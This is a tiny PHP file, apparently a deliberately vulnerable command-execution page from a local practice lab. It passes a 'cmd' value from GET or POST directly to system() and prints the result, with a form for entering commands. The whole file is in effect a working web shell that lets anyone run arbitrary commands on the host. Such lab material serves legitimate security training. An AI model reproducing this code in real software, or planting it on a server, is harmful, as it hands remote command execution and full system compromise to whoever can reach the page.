<?php

/* 
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
if(isset($_GET['cmd'])){
    
    echo system($_GET['cmd']);
    
}

if(isset($_POST['cmd'])){
    
    echo system($_POST['cmd']);
    
}
?>
<form method="post" action="http://localhost/vuln/commandexecution/simplegetcmd.php">
    <input type="text" name="cmd">
    <input type="submit" value="Go!">
</form>
<?php
?>

